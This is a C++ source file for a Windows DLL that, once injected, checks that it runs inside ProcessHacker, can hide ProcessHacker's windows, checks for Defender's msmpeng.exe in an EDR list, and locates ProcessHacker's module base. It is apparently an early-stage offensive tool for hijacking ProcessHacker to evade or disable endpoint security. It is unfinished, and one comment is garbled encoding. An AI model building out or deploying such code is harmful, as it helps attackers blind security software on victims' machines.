#include "memory.hpp"
#include "dbg.hpp"
#include "utils.hpp"
#include "ph.hpp"
#include <Shlwapi.h>
#include "console.hpp"

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	BOOL Result = false;

	do
	{
		DWORD WindowProcessID = 0;

		GetWindowThreadProcessId(hwnd, &WindowProcessID);

		if (WindowProcessID == GetCurrentProcessId() && hwnd != GetConsoleWindow())
		{
			ShowWindow(hwnd, SW_HIDE);
		}

		Result = true;
	} while (false);

	return Result;
}

VOID HideWindow()
{
	while (true)
	{
		EnumWindows(EnumWindowsProc, NULL);

		Sleep(100);
	}
}

VOID main()
{
	Utils::isInEdrlist(L"msmpeng.exe");
	return;

	MessageBoxA(0, "Main", "Debug", 0);

	if (!Memory::Init() /*|| !Console::Init()*/)
	{
		return;
	}

#ifdef _DEBUG
	if (!Debug::Init(DEBUG_OUTPUT_MODE_FILE))
	{
		return;
	}
#endif

	if (!Utils::IsLaunchedInsidePH())
	{
#ifdef _DEBUG
		Debug::DbgOutW(L"[INFO] %s:%d | DLL was launched not inside ProcessHacker process\n", __FILEW__, __LINE__);
#endif
		ExitProcess(ERROR_SUCCESS);
	}

	Console::Write(L"[+] Init ok. Sucsessfully launched inside PH\n");

#ifndef _DEBUG
//	if (!CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)HideWindow, nullptr, 0, nullptr))
//	{
//#ifdef _DEBUG
//		Debug::DbgOutW(L"[ERROR] %s:%d | CreateThread failed. Last error: %d\n", __FILEW__, __LINE__, GetLastError());
//#endif
//		ExitProcess(ERROR_SUCCESS);
//	}
#endif

	Console::Write(L"[+] Created thread for hiding PH windows\n");
	Console::Write(L"[~] Will sleep 5 seconds now... PH need some time to initialize internal structures\n");

	// Ñïèì 5 ñåêóíä äëÿ òîãî, ÷òîáû äàòü ïðîöåññõàêåðó èíèöèàëèçèðîâàòüñÿ.
	Sleep(5000);

	PVOID PhBaseAddress = GetModuleHandleW(L"ProcessHacker.exe");

	if (!PhBaseAddress)
	{
#ifdef _DEBUG
		Debug::DbgOutW(L"[ERROR] %s:%d | GetModuleHandleW failed. Last error: %d\n", __FILEW__, __LINE__, GetLastError());
#endif
		ExitProcess(ERROR_SUCCESS);
	}


}

BOOL __stdcall DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{	
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0);
	}

	return TRUE;
}